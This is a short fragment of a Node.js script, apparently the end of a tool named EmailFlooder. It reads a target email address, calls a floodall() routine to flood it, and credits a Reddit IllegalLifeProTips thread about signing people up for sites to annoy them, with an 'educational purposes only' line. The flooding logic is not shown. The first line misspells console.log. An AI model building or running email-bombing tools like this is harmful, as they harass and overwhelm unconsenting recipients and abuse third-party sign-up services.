        consola.log(`FLOODING!`.bold.yellow + ` ${enteredEmail} was entered`);
        await floodall(enteredEmail);

        console.info('COMPLETE! '.bold.green + 'Press any button to exit.');

        process.stdin.setRawMode(true);
        process.stdin.resume();
        process.stdin.on('data', () => {
            rl.close();
        });
    });
}

console.log('Site Source:'.bold.blue + ' https://www.reddit.com/r/IllegalLifeProTips/comments/m7roq9/ilpt_want_to_annoy_someone_sign_them_up_for_these/');
console.log('Github:'.bold.blue + ' https://github.com/foobball/EmailFlooder');
console.log('\nFor educational purposes only!\n'.blue.bold);

start();